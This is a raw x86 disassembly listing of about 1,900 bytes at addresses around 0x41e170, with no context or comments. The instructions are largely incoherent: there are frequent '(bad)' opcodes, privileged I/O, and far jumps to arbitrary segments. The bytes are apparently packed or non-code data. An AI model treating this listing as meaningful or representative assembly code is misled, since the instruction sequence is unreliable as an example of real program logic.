  41e170:	fidiv  WORD PTR [edx+0x4f]
  41e173:	jbe    0x41e1dc
  41e175:	ss mov ebp,0x87095bc9
  41e17b:	shl    DWORD PTR [eax],cl
  41e17d:	xchg   edx,eax
  41e17e:	and    eax,0xe87585a6
  41e183:	mov    BYTE PTR [eax-0xc],al
  41e186:	loopne 0x41e1e3
  41e188:	sbb    edi,DWORD PTR [ecx+0x5914b558]
  41e18e:	mov    ds:0xe5f49066,eax
  41e193:	add    al,0xa1
  41e195:	adc    eax,0x83bba915
  41e19a:	lahf   
  41e19b:	inc    eax
  41e19c:	lock call FWORD PTR [ebx-0x102d56cc]
  41e1a3:	jbe    0x41e1d2
  41e1a5:	aam    0x89
  41e1a7:	pusha  
  41e1a8:	mov    ds:0x4809532b,al
  41e1ad:	mov    bl,0xfd
  41e1af:	and    DWORD PTR ds:0x7ccbe191,esp
  41e1b5:	sahf   
  41e1b6:	push   cs
  41e1b7:	jmp    0x310d:0xe0b0ad75
  41e1be:	add    ebx,esi
  41e1c0:	lahf   
  41e1c1:	retf   
  41e1c2:	pop    edi
  41e1c3:	jp     0x41e22b
  41e1c5:	dec    eax
  41e1c6:	fmul   st,st(0)
  41e1c8:	ds pop eax
  41e1ca:	lods   al,BYTE PTR ds:[esi]
  41e1cb:	call   0xa2bb571e
  41e1d0:	lahf   
  41e1d1:	test   al,0x40
  41e1d3:	push   es
  41e1d4:	arpl   sp,dx
  41e1d6:	push   es
  41e1d7:	inc    edx
  41e1d8:	scas   eax,DWORD PTR es:[edi]
  41e1d9:	pop    ebp
  41e1da:	push   edx
  41e1db:	xchg   ebp,eax
  41e1dc:	xchg   ebp,eax
  41e1dd:	bound  ebp,QWORD PTR [edx+esi*2]
  41e1e0:	mov    esi,0xec99f301
  41e1e5:	mov    bh,0x89
  41e1e7:	fistp  WORD PTR [edx-0x23]
  41e1ea:	iret   
  41e1eb:	pop    ss
  41e1ec:	cmp    eax,ebx
  41e1ee:	push   eax
  41e1ef:	ins    DWORD PTR es:[edi],dx
  41e1f0:	into   
  41e1f1:	pop    esi
  41e1f2:	ficom  WORD PTR [edi+0x49]
  41e1f5:	mov    cl,dh
  41e1f7:	mov    ds:0xd5733a38,eax
  41e1fc:	gs jo  0x41e26a
  41e1ff:	xor    ah,BYTE PTR ds:0xa9b778e4
  41e205:	pop    edx
  41e206:	inc    edi
  41e207:	mov    esi,0x4656d4d5
  41e20c:	pushf  
  41e20d:	mov    esp,0x2e12cc9b
  41e212:	mov    ds:0x8372aaa1,al
  41e217:	aaa    
  41e218:	sub    al,BYTE PTR [eax]
  41e21a:	arpl   WORD PTR [ecx],bx
  41e21c:	xor    al,0x31
  41e21e:	inc    edi
  41e21f:	ins    DWORD PTR es:[edi],dx
  41e220:	fs jmp 0x41e1d6
  41e223:	mov    cl,0x26
  41e225:	mov    ah,0x76
  41e227:	inc    edx
  41e228:	inc    edi
  41e229:	sub    esi,ebp
  41e22b:	adc    bh,BYTE PTR [ecx+0x4133c028]
  41e231:	cmp    eax,0xe2e86e7d
  41e236:	inc    edx
  41e237:	adc    DWORD PTR [ebp-0x4],0xffffff98
  41e23b:	cmp    edx,eax
  41e23d:	and    bh,dh
  41e23f:	inc    esp
  41e240:	stc    
  41e241:	gs lahf 
  41e243:	popf   
  41e244:	fld    QWORD PTR [edi-0x61]
  41e247:	push   0x9e5f5958
  41e24c:	xchg   edx,eax
  41e24d:	loope  0x41e261
  41e24f:	ds in  al,0xe6
  41e252:	(bad)  
  41e254:	jno    0x41e2bd
  41e256:	jne    0x41e1e1
  41e258:	aam    0xfd
  41e25a:	sahf   
  41e25b:	pop    esp
  41e25c:	jbe    0x41e28a
  41e25e:	xor    al,0x67
  41e260:	xchg   esp,eax
  41e261:	div    BYTE PTR [eax]
  41e263:	inc    esi
  41e264:	jae    0x41e216
  41e266:	push   eax
  41e267:	or     al,0xd
  41e269:	jae    0x41e2dd
  41e26b:	pop    edi
  41e26c:	repnz mov DWORD PTR [ecx+0x255a131],edx
  41e273:	gs repz xchg edi,eax
  41e276:	dec    eax
  41e277:	mov    ah,0x7c
  41e279:	daa    
  41e27a:	xlat   BYTE PTR ds:[ebx]
  41e27b:	sbb    al,0xde
  41e27d:	aad    0x5a
  41e27f:	scas   eax,DWORD PTR es:[edi]
  41e280:	dec    ecx
  41e281:	push   edi
  41e282:	jl     0x41e230
  41e284:	sub    BYTE PTR ds:[eax+edi*4-0x69a84553],dl
  41e28c:	xchg   ebx,eax
  41e28d:	xchg   esp,eax
  41e28e:	test   DWORD PTR [esi-0x7b],eax
  41e291:	push   ebx
  41e292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e293:	mov    ah,0x51
  41e295:	mov    bl,0x31
  41e297:	jnp    0x41e26a
  41e299:	fdivr  DWORD PTR [edx-0x1beff427]
  41e29f:	call   0x8c726a37
  41e2a4:	mov    dl,0x21
  41e2a6:	lahf   
  41e2a7:	pop    esi
  41e2a8:	or     BYTE PTR [eax-0x246de0e],bh
  41e2ae:	nop
  41e2af:	out    0x36,eax
  41e2b1:	scas   eax,DWORD PTR es:[edi]
  41e2b2:	adc    BYTE PTR [esi-0x48],0x3
  41e2b6:	xor    eax,0x59c327e9
  41e2bb:	(bad)  
  41e2bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2bd:	lds    eax,FWORD PTR [ecx-0x3f56cc3b]
  41e2c3:	pusha  
  41e2c4:	sbb    BYTE PTR [esi+0x74],ch
  41e2c7:	sti    
  41e2c8:	popf   
  41e2c9:	cmp    ah,al
  41e2cb:	pop    edi
  41e2cc:	fwait
  41e2cd:	sar    DWORD PTR [ebx+esi*4],cl
  41e2d0:	(bad)  
  41e2d1:	in     al,dx
  41e2d2:	je     0x41e2c3
  41e2d4:	aaa    
  41e2d5:	(bad)  
  41e2d7:	lods   eax,DWORD PTR ds:[esi]
  41e2d8:	and    al,0x24
  41e2da:	div    DWORD PTR [esi+0x4a]
  41e2dd:	and    BYTE PTR [ebx],bl
  41e2df:	cmp    BYTE PTR [ebx+edx*2-0x3b7cf4a7],dh
  41e2e6:	push   ebp
  41e2e7:	pushf  
  41e2e8:	dec    ebx
  41e2e9:	sub    bl,BYTE PTR [eax+0x5c8a9664]
  41e2ef:	dec    esp
  41e2f0:	mov    edx,0x7461bbe1
  41e2f5:	test   al,0x54
  41e2f7:	(bad)  
  41e2f8:	stos   BYTE PTR es:[edi],al
  41e2f9:	gs int3 
  41e2fb:	shl    BYTE PTR [esi+edi*8-0x62091d59],cl
  41e302:	add    BYTE PTR [ecx+edx*2],al
  41e305:	nop
  41e306:	test   eax,0xf29b1132
  41e30b:	bound  esi,QWORD PTR ds:0x31aebbf
  41e311:	push   esi
  41e312:	cmp    eax,0x95e99d83
  41e317:	sub    ebx,edx
  41e319:	mov    esp,DWORD PTR [ebp-0x1bf287b5]
  41e31f:	test   eax,0x3dd51675
  41e324:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e325:	xchg   ecx,eax
  41e326:	and    dh,bl
  41e328:	xchg   ecx,eax
  41e329:	add    BYTE PTR [esi+0x13],ch
  41e32c:	add    ecx,edx
  41e32e:	pop    ebx
  41e32f:	js     0x41e2b3
  41e331:	mov    al,ds:0xa5715d90
  41e336:	in     eax,0xc4
  41e338:	xchg   BYTE PTR [ebx+0x173e3577],bl
  41e33e:	xor    esp,0xffffff85
  41e341:	inc    ecx
  41e342:	dec    ebp
  41e343:	push   cs
  41e344:	rol    BYTE PTR [edx-0x4705054c],cl
  41e34a:	push   es
  41e34b:	stos   DWORD PTR es:[edi],eax
  41e34c:	sub    BYTE PTR ds:[edx+0x179c1f65],al
  41e353:	retf   
  41e354:	cwde   
  41e355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e356:	jbe    0x41e31f
  41e358:	icebp  
  41e359:	push   cs
  41e35a:	inc    ax
  41e35c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e35d:	xor    bl,BYTE PTR [esi+0x3a]
  41e360:	add    ecx,ebp
  41e362:	inc    esp
  41e363:	outs   dx,DWORD PTR ds:[esi]
  41e364:	enter  0x549c,0x9c
  41e368:	call   0x92d9ff1e
  41e36d:	cmp    eax,0x94ae53d5
  41e372:	sub    eax,0x87ec4f3f
  41e377:	adc    dl,BYTE PTR [edi+0x3d]
  41e37a:	or     DWORD PTR [eax-0x4e31f0bc],ecx
  41e380:	stos   BYTE PTR es:[edi],al
  41e381:	inc    edi
  41e382:	sbb    al,0xd1
  41e384:	fcom   QWORD PTR [esi-0x40]
  41e387:	repz loope 0x41e30b
  41e38a:	jmp    FWORD PTR [ebx+0x26]
  41e38d:	mov    ah,0xf0
  41e38f:	mov    dh,BYTE PTR [esi-0x49b078e]
  41e395:	ret    
  41e396:	xchg   esp,eax
  41e397:	mov    esp,0x1fe2aaa1
  41e39c:	inc    edi
  41e39d:	call   0xfe55:0xc91fbb0e
  41e3a4:	sbb    eax,0x5fcc492c
  41e3a9:	lock loop 0x41e368
  41e3ac:	jle    0x41e3a3
  41e3ae:	rol    DWORD PTR [edi],1
  41e3b0:	add    DWORD PTR [ebp-0x1c01e220],ebx
  41e3b6:	in     al,0x4a
  41e3b8:	xchg   ebx,eax
  41e3b9:	shr    BYTE PTR [esi-0x20],0x69
  41e3bd:	sub    al,0x2d
  41e3bf:	sub    ah,BYTE PTR [eax+esi*2]
  41e3c2:	jmp    0x23bc513f
  41e3c7:	in     eax,0xed
  41e3c9:	add    eax,0x3c9069d1
  41e3ce:	addr16 call 0x73c8:0xf878087e
  41e3d6:	rol    BYTE PTR [eax+0x32965ede],1
  41e3dc:	outs   dx,DWORD PTR ds:[esi]
  41e3dd:	or     eax,ecx
  41e3df:	add    DWORD PTR [esi-0x5cd7e61a],ebp
  41e3e5:	mov    bh,0x98
  41e3e7:	enter  0x7e86,0x9b
  41e3eb:	push   ds
  41e3ec:	ror    DWORD PTR [ebx-0x3e],cl
  41e3ef:	mov    cl,0xe9
  41e3f1:	jp     0x41e392
  41e3f3:	or     DWORD PTR [ecx-0x18],ebp
  41e3f6:	sahf   
  41e3f7:	mov    edi,es
  41e3f9:	aas    
  41e3fa:	mov    esp,edx
  41e3fc:	mov    ecx,0x22774c15
  41e401:	add    cl,dh
  41e403:	dec    ebp
  41e404:	xor    bl,BYTE PTR [esp+edi*1]
  41e407:	or     eax,0x12fa1702
  41e40c:	imul   esp,DWORD PTR ds:0x5393e9d7,0xffffffc6
  41e413:	pushf  
  41e414:	call   0x68e28699
  41e419:	(bad)  
  41e41a:	mov    ecx,0xe3a4d8d8
  41e41f:	lods   eax,DWORD PTR ds:[esi]
  41e420:	adc    eax,0x83692321
  41e425:	and    ebp,DWORD PTR [esi+edx*2+0x23]
  41e429:	popf   
  41e42a:	mov    ah,0xac
  41e42c:	ja     0x41e3e3
  41e42e:	repnz mov esp,0xf8ca32e3
  41e434:	pop    ebx
  41e435:	mov    esp,0xa5aa04bc
  41e43a:	leave  
  41e43b:	or     DWORD PTR [ebx+eiz*1+0x6b],ebx
  41e43f:	or     DWORD PTR [ebp-0x2e],0x69
  41e443:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e444:	int    0xa7
  41e446:	xor    DWORD PTR [eax+0x44],esi
  41e449:	and    DWORD PTR [ecx+0x66],0xfc75735a
  41e450:	xor    eax,0xeb2ce51b
  41e455:	jp     0x41e3f5
  41e457:	in     eax,0x22
  41e459:	mov    edi,0x93bd8332
  41e45e:	mov    edi,0x836e89a3
  41e463:	xor    DWORD PTR [esi],edi
  41e465:	or     eax,DWORD PTR [ebp-0x1b34e56]
  41e46b:	imul   eax,DWORD PTR [edi],0x998dfc14
  41e471:	adc    al,0xfe
  41e473:	mov    ah,0x56
  41e475:	sbb    al,0x54
  41e477:	adc    dl,dl
  41e479:	xor    eax,DWORD PTR [edi]
  41e47b:	fild   QWORD PTR [esi-0x58ba614b]
  41e481:	retf   
  41e482:	mov    dl,0x2f
  41e484:	pop    ebp
  41e485:	rcl    DWORD PTR [eax],0xb9
  41e488:	adc    DWORD PTR [ecx+0x5a107cbd],ebx
  41e48e:	mov    dl,0xe
  41e490:	in     eax,0xdf
  41e492:	bound  eax,QWORD PTR [edi+0x38dad06e]
  41e498:	shr    BYTE PTR [edi],0x7a
  41e49b:	idiv   DWORD PTR [ebx-0x1a1ead1a]
  41e4a1:	imul   eax,DWORD PTR [esi],0xffffff81
  41e4a4:	outs   dx,BYTE PTR ds:[esi]
  41e4a5:	fsub   DWORD PTR [ecx+0x155d51f5]
  41e4ab:	retf   0x79b5
  41e4ae:	sbb    eax,0xa9e92260
  41e4b3:	je     0x41e46f
  41e4b5:	mov    ch,0x11
  41e4b7:	push   eax
  41e4b8:	mov    esi,0x396666ba
  41e4bd:	stos   DWORD PTR es:[edi],eax
  41e4be:	(bad)  
  41e4c0:	xor    al,BYTE PTR [edx]
  41e4c2:	ret    0x70e
  41e4c5:	push   edi
  41e4c6:	or     al,0x19
  41e4c8:	and    al,0x68
  41e4ca:	mov    ecx,0xde0ad04
  41e4cf:	daa    
  41e4d0:	cmp    eax,0x22df082e
  41e4d5:	dec    ebp
  41e4d6:	or     al,0x96
  41e4d8:	fcmovu st,st(5)
  41e4da:	std    
  41e4db:	or     ah,BYTE PTR [esi-0x64]
  41e4de:	mov    bh,0x50
  41e4e0:	mov    dh,0xb1
  41e4e2:	or     edi,DWORD PTR es:[bx+di]
  41e4e6:	mov    bl,0xc9
  41e4e8:	std    
  41e4e9:	repnz mov edi,0xdcedabd0
  41e4ef:	jge    0x41e4c0
  41e4f1:	sub    eax,0x4c811ee
  41e4f6:	pop    ds
  41e4f7:	mov    eax,ds:0x99650349
  41e4fc:	sar    DWORD PTR [ebx+0x3d],cl
  41e4ff:	test   ebp,edi
  41e501:	popf   
  41e502:	or     al,0xed
  41e504:	inc    ebx
  41e505:	cmp    BYTE PTR [esi],ch
  41e507:	sub    edx,DWORD PTR [edi+ecx*8-0x30]
  41e50b:	leave  
  41e50c:	push   edi
  41e50d:	daa    
  41e50e:	repz iret 
  41e510:	mov    ebx,0x80bf658b
  41e515:	pop    ds
  41e516:	cmp    BYTE PTR [ebp+0x2a94f9a7],0x60
  41e51d:	fidivr DWORD PTR [ebx-0x51667eb0]
  41e523:	popf   
  41e524:	cwde   
  41e525:	rcl    DWORD PTR [eax],cl
  41e527:	jg     0x41e53f
  41e529:	jecxz  0x41e509
  41e52b:	test   BYTE PTR [ebx],ah
  41e52d:	xchg   esp,eax
  41e52e:	in     eax,0x6
  41e530:	sub    eax,0x3cbad410
  41e535:	loopne 0x41e52f
  41e537:	shl    BYTE PTR [edx],1
  41e539:	inc    ebx
  41e53a:	fs jne 0x41e512
  41e53d:	sti    
  41e53e:	sbb    esi,DWORD PTR [ebp-0x13]
  41e541:	inc    ebx
  41e542:	cmc    
  41e543:	and    al,0xfa
  41e545:	cld    
  41e546:	aam    0x97
  41e548:	mov    al,ds:0x727ebb4a
  41e54d:	add    BYTE PTR [ecx],bh
  41e54f:	cmc    
  41e550:	sti    
  41e551:	popf   
  41e552:	cmp    BYTE PTR [ebx+0x34],0xd5
  41e556:	cmp    DWORD PTR [eax-0xa],0x15
  41e55a:	or     al,0x98
  41e55c:	fimul  DWORD PTR [ecx-0x569af0cc]
  41e562:	stc    
  41e563:	gs or  al,0xfc
  41e566:	lahf   
  41e567:	cmp    eax,0xb670ad12
  41e56c:	inc    ecx
  41e56d:	inc    eax
  41e56e:	lods   al,BYTE PTR ds:[esi]
  41e56f:	out    dx,eax
  41e570:	inc    esp
  41e571:	(bad)  
  41e572:	dec    esi
  41e573:	xchg   ebp,eax
  41e574:	xor    eax,0x825c72ff
  41e579:	sub    BYTE PTR [eax],cl
  41e57b:	sbb    edx,DWORD PTR ds:0x6b519b9a
  41e582:	adc    ebx,ebp
  41e584:	leave  
  41e585:	or     eax,0x433c0659
  41e58a:	outs   dx,BYTE PTR ds:[esi]
  41e58b:	pop    ebx
  41e58c:	xchg   ebp,eax
  41e58d:	xlat   BYTE PTR ds:[ebx]
  41e58e:	sbb    ebp,ebx
  41e590:	pop    ss
  41e591:	mov    edx,0xcd861d70
  41e596:	test   eax,0x42c1d672
  41e59b:	xor    eax,0xd3400670
  41e5a0:	in     eax,dx
  41e5a1:	cs mov al,0x2f
  41e5a4:	dec    esp
  41e5a5:	je     0x41e5c3
  41e5a7:	push   edi
  41e5a8:	sbb    eax,0x5254f8a5
  41e5ad:	cmp    al,0x9e
  41e5af:	push   edx
  41e5b0:	xor    DWORD PTR [ecx],edi
  41e5b2:	(bad)  
  41e5b3:	xchg   edi,eax
  41e5b4:	mov    ecx,0xff36454b
  41e5b9:	dec    ebp
  41e5ba:	pop    ebx
  41e5bb:	sti    
  41e5bc:	push   es
  41e5bd:	mov    esp,0x10c0f855
  41e5c2:	cmp    al,BYTE PTR [ecx+edi*4]
  41e5c5:	add    bl,BYTE PTR [ebp+0x751c00ca]
  41e5cb:	cld    
  41e5cc:	mul    ah
  41e5ce:	std    
  41e5cf:	cmp    BYTE PTR [ebx],bl
  41e5d1:	lock pop ebp
  41e5d3:	stos   BYTE PTR es:[edi],al
  41e5d4:	lea    ecx,[edx]
  41e5d6:	aam    0x9f
  41e5d8:	jmp    0x8519a1ea
  41e5dd:	outs   dx,DWORD PTR ds:[esi]
  41e5de:	lahf   
  41e5df:	mov    ebx,0xf63598c5
  41e5e4:	lds    esp,FWORD PTR [ecx+0x5e8ca17a]
  41e5ea:	loop   0x41e57d
  41e5ec:	test   BYTE PTR [ebp-0x46],dh
  41e5ef:	adc    al,0xa8
  41e5f1:	repnz mov edi,0xc2ace3be
  41e5f7:	outs   dx,DWORD PTR ds:[esi]
  41e5f8:	mov    al,0xde
  41e5fa:	mov    ch,0xb
  41e5fc:	jno    0x41e5e7
  41e5fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5ff:	jae    0x41e61b
  41e601:	(bad)  
  41e602:	cmp    esp,DWORD PTR [esp+esi*8]
  41e605:	and    eax,DWORD PTR [ecx+eax*2]
  41e608:	xor    al,0x89
  41e60a:	jne    0x41e601
  41e60c:	cmp    BYTE PTR [esi+0x5d93a680],ch
  41e612:	mov    ?,WORD PTR ds:0x297b71a9
  41e618:	iret   
  41e619:	daa    
  41e61a:	into   
  41e61b:	jecxz  0x41e608
  41e61d:	inc    ebp
  41e61e:	cmp    al,0x94
  41e620:	nop
  41e621:	out    0xc9,al
  41e623:	pop    ebx
  41e624:	and    ebp,DWORD PTR [edx-0x2e]
  41e627:	test   eax,0x209cddcb
  41e62c:	out    dx,al
  41e62d:	dec    edi
  41e62e:	push   ds
  41e62f:	pop    edi
  41e630:	lds    ebp,FWORD PTR [eax-0x54975046]
  41e636:	jg     0x41e662
  41e638:	loope  0x41e62a
  41e63a:	loope  0x41e618
  41e63c:	mov    al,ds:0xa329609a
  41e641:	or     al,0x1d
  41e643:	adc    eax,0xede97552
  41e648:	retf   
  41e649:	inc    ecx
  41e64a:	lds    ebx,FWORD PTR [eax]
  41e64c:	adc    DWORD PTR ds:0xe463b150,edx
  41e652:	gs sub eax,0xa21f9ee
  41e658:	and    bh,bl
  41e65a:	dec    ecx
  41e65b:	push   edx
  41e65c:	fmul   DWORD PTR [esi]
  41e65e:	clc    
  41e65f:	or     bh,bl
  41e661:	xchg   esi,eax
  41e662:	sbb    DWORD PTR [esi+0x29ed1259],esp
  41e668:	sbb    edi,DWORD PTR [ebp-0x59d5b8fa]
  41e66e:	push   edx
  41e66f:	pop    ecx
  41e670:	test   DWORD PTR [esi+ebp*2+0x1c086ddd],eax
  41e677:	arpl   dx,dx
  41e679:	xchg   ch,dl
  41e67b:	dec    esp
  41e67c:	mov    al,0x81
  41e67e:	pop    ds
  41e67f:	xchg   DWORD PTR [edx+0x4f],ebp
  41e682:	cld    
  41e683:	mov    al,0xe5
  41e685:	jnp    0x41e623
  41e687:	(bad)  
  41e688:	xchg   DWORD PTR [ecx+0x63],esp
  41e68b:	or     al,0xbe
  41e68d:	cli    
  41e68e:	in     al,dx
  41e68f:	mov    edx,0x3c1d3d6f
  41e694:	iret   
  41e695:	clc    
  41e696:	in     al,dx
  41e697:	mov    ah,0xc3
  41e699:	sar    BYTE PTR [ebx-0xc24c0ef],0xf3
  41e6a0:	lods   eax,DWORD PTR ds:[esi]
  41e6a1:	ja     0x41e640
  41e6a3:	fsub   DWORD PTR [eax-0x4f]
  41e6a6:	fimul  WORD PTR [edi+eax*8-0x18]
  41e6aa:	mov    esp,0x9b85634d
  41e6af:	ds dec ebp
  41e6b1:	out    0x55,al
  41e6b3:	add    ecx,DWORD PTR [eax-0x59]
  41e6b6:	daa    
  41e6b7:	or     bh,cl
  41e6b9:	in     al,0x14
  41e6bb:	pop    ebp
  41e6bc:	stos   DWORD PTR es:[edi],eax
  41e6bd:	push   esp
  41e6be:	push   0x51
  41e6c0:	loope  0x41e73a
  41e6c2:	lods   al,BYTE PTR ds:[esi]
  41e6c3:	and    al,dl
  41e6c5:	xor    edx,DWORD PTR [ebp-0x5502f2ce]
  41e6cb:	mov    ds:0xbbdb4cba,eax
  41e6d0:	xchg   esp,eax
  41e6d1:	sbb    eax,0x657f496b
  41e6d6:	jle    0x41e757
  41e6d8:	mov    ebp,0xd469224b
  41e6dd:	dec    esp
  41e6de:	jae    0x41e66f
  41e6e0:	in     eax,0xa
  41e6e2:	retf   
  41e6e3:	or     edx,0x12
  41e6e6:	lods   eax,DWORD PTR ds:[esi]
  41e6e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6e8:	mov    eax,0x67e19f12
  41e6ed:	inc    esi
  41e6ee:	push   0x41a9cf59
  41e6f3:	push   edi
  41e6f4:	sbb    dh,BYTE PTR [eax-0x6779821a]
  41e6fa:	outs   dx,DWORD PTR ds:[esi]
  41e6fb:	stos   BYTE PTR es:[edi],al
  41e6fc:	or     edi,ecx
  41e6fe:	(bad)  [ebx-0x6342e66e]
  41e704:	mov    al,0xf9
  41e706:	inc    esp
  41e707:	dec    edx
  41e708:	cmp    DWORD PTR [edi],ebx
  41e70a:	or     edx,DWORD PTR [ecx]
  41e70c:	inc    ebx
  41e70d:	push   0x4aa6228f
  41e712:	loope  0x41e6ca
  41e714:	in     eax,dx
  41e715:	fisttp QWORD PTR [esp+esi*2]
  41e718:	jae    0x41e721
  41e71a:	mov    al,0x35
  41e71c:	inc    edx
  41e71d:	sti    
  41e71e:	and    esp,DWORD PTR [ebp+0x69]
  41e721:	inc    ebp
  41e722:	jae    0x41e6c3
  41e724:	icebp  
  41e725:	or     DWORD PTR [edx+ebp*4-0x73],eax
  41e729:	neg    dl
  41e72b:	jne    0x41e6c0
  41e72d:	adc    DWORD PTR [esi-0x6],ebp
  41e730:	(bad)  
  41e731:	hlt    
  41e732:	(bad)  
  41e733:	jecxz  0x41e7ad
  41e735:	dec    esi
  41e736:	add    DWORD PTR [edi],eax
  41e738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e739:	pop    ebp
  41e73a:	dec    esi
  41e73b:	push   0xffffffc7
  41e73d:	mov    cl,0x5e
  41e73f:	dec    esi
  41e740:	outs   dx,BYTE PTR ds:[esi]
  41e741:	pop    ebx
  41e742:	cli    
  41e743:	push   ecx
  41e744:	sub    DWORD PTR ds:0x5f1cd055,0xe9746a34
  41e74f:	and    DWORD PTR [ebx+0x6d],ebp
  41e752:	mov    bl,0x16
  41e754:	fsub   DWORD PTR ds:0x8bcf3216
  41e75a:	pop    ds
  41e75b:	stc    
  41e75c:	out    0x6b,al
  41e75e:	aas    
  41e75f:	daa    
  41e760:	mov    ebx,0x5a1cbc77
  41e765:	sub    ch,dh
  41e767:	imul   edx,DWORD PTR [edi],0x7a
  41e76a:	mov    ds:0x39f382be,al
  41e76f:	jg     0x41e714
  41e771:	sub    ebp,DWORD PTR [eax]
  41e773:	test   al,0x44
  41e775:	repnz aas 
  41e777:	push   ss
  41e778:	pop    ds
  41e779:	fs xor al,0x18
  41e77c:	icebp  
  41e77d:	dec    edi
  41e77e:	cwde   
  41e77f:	cmc    
  41e780:	fwait
  41e781:	push   ecx
  41e782:	sbb    esp,esi
  41e784:	mov    bh,0xe9
  41e786:	pop    esi
  41e787:	pop    ecx
  41e788:	or     DWORD PTR [ecx+0x35152a94],0xffffff99
  41e78f:	mov    ebx,0x88f2c5df
  41e794:	(bad)  
  41e796:	cli    
  41e797:	xor    DWORD PTR [ecx+0x33750c79],ecx
  41e79d:	add    edx,DWORD PTR [ebx+esi*2]
  41e7a0:	lods   eax,DWORD PTR ds:[esi]
  41e7a1:	repnz test DWORD PTR [eax+0x5df88764],0x41838ea6
  41e7ac:	lea    esp,[esi]
  41e7ae:	push   esp
  41e7af:	enter  0x2d33,0x6c
  41e7b3:	cmp    bl,BYTE PTR [edx+ebp*4+0x1d316f4c]
  41e7ba:	ror    BYTE PTR [ebp-0x68413014],0x4b
  41e7c1:	sbb    DWORD PTR [esi+0x44],esi
  41e7c4:	xchg   edi,eax
  41e7c5:	adc    DWORD PTR [eax+0x27],ebx
  41e7c8:	nop
  41e7c9:	cwde   
  41e7ca:	jge    0x41e7ee
  41e7cc:	out    0x9d,al
  41e7ce:	arpl   WORD PTR [edx-0x3f],dx
  41e7d1:	loopne 0x41e7fc
  41e7d3:	mov    edi,DWORD PTR [edx-0x60f87849]
  41e7d9:	int    0x54
  41e7db:	bound  ecx,QWORD PTR [edi+0x1d]
  41e7de:	in     eax,dx
  41e7df:	mov    esi,0xd722a7d9
  41e7e4:	xchg   BYTE PTR [esi-0x27c42698],bl
  41e7ea:	fistp  WORD PTR [edi]
  41e7ec:	nop
  41e7ed:	cli    
  41e7ee:	mov    bh,0xf3
  41e7f0:	cmp    al,0x15
  41e7f2:	push   esi
  41e7f3:	mov    edi,esp
  41e7f5:	or     al,0x65
  41e7f7:	xor    esi,ebx
  41e7f9:	fnstsw WORD PTR [ebp+0x24]
  41e7fc:	in     al,dx
  41e7fd:	call   0xf83f:0xef178a01
  41e804:	push   ds
  41e805:	inc    edx
  41e806:	addr16 add ecx,0xa6c0942a
  41e80d:	mov    edi,0x89fb8572
  41e812:	cmp    eax,0xf910f3bd
  41e817:	jecxz  0x41e86d
  41e819:	pop    ds
  41e81a:	add    al,0x9c
  41e81c:	jecxz  0x41e88d
  41e81e:	cmp    al,0xb2
  41e820:	addr16 enter 0xdc44,0x20
  41e825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e826:	jb     0x41e889
  41e828:	fidivr DWORD PTR [edi]
  41e82a:	adc    ch,BYTE PTR [ecx+0x69803b77]
  41e830:	lods   eax,DWORD PTR ds:[esi]
  41e831:	and    BYTE PTR [ebx-0x6],dl
  41e834:	pop    ss
  41e835:	jge    0x41e7cd
  41e837:	xchg   edx,eax
  41e838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e839:	cmp    DWORD PTR [ebx+0x2efae7d7],edx
  41e83f:	and    eax,0x5f3b79c
  41e844:	fst    DWORD PTR [ebx+0x50ba9405]
  41e84a:	or     eax,0x3aa8f1dd
  41e84f:	fidiv  WORD PTR [edx+0x3d6e00f0]
  41e855:	sub    BYTE PTR [ebx],cl
  41e857:	xchg   DWORD PTR [esi-0x2540aadb],ebx
  41e85d:	mov    dh,0xcc
  41e85f:	out    dx,al
  41e860:	scas   eax,DWORD PTR es:[edi]
  41e861:	jns    0x41e89d
  41e863:	sbb    BYTE PTR [edx-0x79],ah
  41e866:	pop    ss
  41e867:	pusha  
  41e868:	inc    ebp
  41e869:	sub    esp,DWORD PTR [eax+0x25]
  41e86c:	popa   
  41e86d:	fidiv  DWORD PTR [esi-0x24]
  41e870:	sti    
  41e871:	int3   
  41e872:	jo     0x41e87f
  41e874:	sub    BYTE PTR [ebx+0x4b],dl
  41e877:	push   ss
  41e878:	xlat   BYTE PTR ds:[ebx]
  41e879:	push   cs
  41e87a:	scas   eax,DWORD PTR es:[edi]
  41e87b:	jns    0x41e88d
  41e87d:	in     eax,0x49
  41e87f:	call   0x1861ac9f
  41e884:	sbb    bl,BYTE PTR [edi+eiz*2+0x10]
  41e888:	mov    ah,0xeb
  41e88a:	out    dx,al
  41e88b:	xor    dh,BYTE PTR [edx]
  41e88d:	or     al,ch
  41e88f:	(bad)  
  41e890:	retf   
  41e891:	ins    DWORD PTR es:[edi],dx
  41e892:	jecxz  0x41e883
  41e894:	or     eax,0xe2e9d4ce
  41e899:	arpl   WORD PTR ss:[edx-0x6],bx
  41e89d:	xchg   edx,eax
  41e89e:	call   FWORD PTR [ebx+esi*4-0x77]
  41e8a2:	xor    al,0x67
  41e8a4:	mov    eax,ds:0xd83cd327
  41e8a9:	inc    ecx
  41e8aa:	cli    
  41e8ab:	mov    ds:0x8a7f2c91,al
  41e8b0:	cmp    ebp,DWORD PTR [edx]
  41e8b2:	es pop esi
  41e8b4:	lods   eax,DWORD PTR ds:[esi]
  41e8b5:	in     eax,0x2e
  41e8b7:	xor    ebp,DWORD PTR ds:0xc56e67db
  41e8bd:	repnz out 0x91,eax
  41e8c0:	(bad)  
  41e8c1:	mov    dl,0x5f
  41e8c3:	data16 test al,0x2f
  41e8c6:	test   dh,ch
  41e8c8:	push   ebx
  41e8c9:	add    BYTE PTR [ebx],cl
  41e8cb:	aam    0x70
  41e8cd:	mul    BYTE PTR [ebp-0x3625f8d3]
  41e8d3:	shl    ebx,1
  41e8d5:	sub    dh,BYTE PTR [esi-0x6c3a0550]
  41e8db:	xchg   edi,eax
  41e8dc:	outs   dx,DWORD PTR ds:[esi]
  41e8dd:	clc    
  41e8de:	dec    ebx
  41e8df:	cmp    eax,0x53fc9da
